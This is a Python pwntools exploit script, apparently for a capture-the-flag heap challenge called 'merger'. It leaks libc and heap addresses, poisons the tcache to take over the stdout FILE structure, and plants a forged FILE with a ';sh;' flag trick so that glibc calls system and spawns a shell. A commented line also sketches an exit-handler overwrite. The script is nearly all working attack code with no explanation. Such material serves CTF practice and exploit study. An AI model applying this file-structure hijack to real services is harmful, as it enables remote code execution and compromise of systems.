from pwn import *
from subprocess import check_output
import sys
import os

_path = "./merger_patched"
context.binary = exe = ELF(_path, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
#ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
addr = 'localhost'
port = 8080
cmd = f'''
    set solib-search-path {os.getcwd()}
    decompiler connect ida --host localhost --port 3662
    continue
    brva 0x162A
'''

context.terminal = ['wt.exe', 'wsl', '-e', 'bash', '-c']

def get_pid(name):
    return int(check_output(["pgrep", "-f", "-n", name]))
def conn():
    if args.LOCAL:
        if args.GDB:
            p = gdb.debug(_path, cmd)
        else:
            p = exe.process()
    
    if args.DOCKER:
        p = remote(addr, port)
        sleep(2)
        if args.GDB:
            pid = get_pid("")
            gdb.attach(pid, exe=exe.path,
                    gdbscript=cmd+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe")
            pause()

    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return p(rol(v ^ key, 0x11, 64))

#############  next | count  | type (cxa) | addr                             | arg               | not used
#onexit_fun =  p(0) + p(1)  +  p(4)       + encrypt(libc.sym['system'], key) + p(heap + 0x2c0)  +  p(0)



def p(_data, _arch = 64, endian = 'little'):
    switcher = {
        64: p64(_data & 0xffffffffffffffff, endian),
        32: p32(_data & 0xffffffff, endian),
        16: p16(_data & 0xffff, endian),
        8:  p8(_data & 0xff, endian)
    }
    return switcher[_arch]


chall = conn()

def sl(_data):
    chall.sendline(_data)

def sla(rgx, _data):
    chall.sendlineafter(rgx, _data)

def se(_data):
    chall.send(_data)

def sa(rgx, _data):
    chall.sendafter(rgx, _data)

def check():
    chall.interactive()
    exit()

def add(idx, sz, data):
    sla(b"> ", b"1")
    sla(b"index: ", str(idx).encode())
    sla(b"size: ", str(sz).encode())
    sla(b"data: ", data)

def drop(idx):
    sla(b"> ", b"2")
    sla(b"index: ", str(idx).encode())

def show(idx):
    sla(b"> ", b"3")
    sla(b"index: ", str(idx).encode())

def merge(idx1, idx2):
    sla(b"> ", b"4")
    sla(b"dst: ", str(idx1).encode())
    sla(b"src: ", str(idx2).encode())

def main():

    for i in range(8):
        add(i, 0xf7, b"A"*8)
    add(9, 0x17, b"B"*8)
    for i in range(8):
        add(11+i, 0x97, b"D"*0x97)
    for i in range(8):
        drop(i)
    add(20, 0x7, b"E"*0x7)
    add(10, 0x97, b"E"*0x97)
    for i in range(7):
        drop(11+i)
    merge(10, 10)
    chall.recvuntil(b"Merged: " + b"E"*0x97)
    leak = u64(chall.recv(6).ljust(8, b"\00"))
    libc.address = leak - libc.sym.main_arena - 96
    log.info(f"libc @ {hex(libc.address)}")
    add(21, 0xd7, p64(libc.sym.main_arena + 96)*2)
    for i in range(10):
        add(i, 0x17, b"A")
    for i in range(7):
        drop(i+1)
    # input()
    drop(0)
    show(21)
    # input()
    # chall.recv(1)
    leak = u64(chall.recv(5).ljust(8, b"\00"))
    heap = leak << 12
    log.info(f"heap @ {hex(heap)}")
    drop(9)
    drop(21)
    for i in range(7):
        add(i, 0x17, b"A")
    add(0, 0x17, p64((heap + 0x100) ^ leak))
    for i in range(2):
        add(i, 0x17, b"A")
    add(0, 0x17, p64(libc.sym._IO_2_1_stdout_))
    input()
    _op_file = FileStructure()
    _op_file.unknown2 = p(0)*2 + p(libc.sym["system"]) + p(0)*3 + p(libc.sym["_IO_wfile_jumps"] - 0x20 ) + p(libc.sym["_IO_2_1_stdout_"] +0x50)
    _op_file._wide_data = libc.sym["_IO_2_1_stdout_"]
    _op_file.flags = 0xfbad20b1 + (int.from_bytes(b';sh;', 'little') << 32)
    _op_file._lock = libc.address + 0x205000
    _tmp_file = bytes(_op_file)
    add(0, 0xf7, _tmp_file)




    check()

if __name__ == "__main__":
    main()
